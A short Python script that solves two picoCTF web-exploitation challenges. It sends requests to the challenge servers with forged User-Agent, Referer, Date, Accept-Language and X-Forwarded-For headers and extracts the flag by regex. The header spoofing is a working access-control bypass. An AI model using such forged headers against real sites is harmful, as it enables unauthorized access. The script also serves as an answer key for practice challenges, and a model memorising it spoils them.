#!/usr/bin/env python3

import re
import sys
import requests
def cariFlag(strToCheck):
    rx = re.compile("(picoCTF{.*})")
    picoRegex = rx.search(strToCheck)
    if(picoRegex != None):
        print(picoRegex.groups()[0] + "\n")

def whoareyou():
    url = 'http://mercury.picoctf.net:39114/'
    headers = {'User-Agent': 'PicoBrowser', 'Referer':url, 'Date':'2018', 'DNT':'1', 'Accept-Language':'sv', 'X-Forwarded-For':'80.80.20.16'}
    r = requests.get(url, headers=headers)
    cariFlag(r.text)
    

def picobrowser():
    url = 'http://jupiter.challenges.picoctf.org:28921/flag'
    headers = {'User-Agent': 'picobrowser!', 'Referer':url, 'Date':'2018', 'DNT':'1', 'Accept-Language':'sv', 'X-Forwarded-For':'80.80.20.16'}
    r = requests.get(url, headers=headers)
    cariFlag(r.text)

x = ''

while (x != 'x'):
    print("======== picoCTF.org Web Exploitation ======")
    print("1. Web Exploitation (Who are you?)")
    print("2. Web Exploitation (picobrowser)")
    print("x. Exit")
    x  = input("Choose Challange picoCTF:")
    if( x == 'x'):
        sys.exit(0)
    elif( x == '1'):
        whoareyou()
    elif( x == '2'):
        picobrowser()

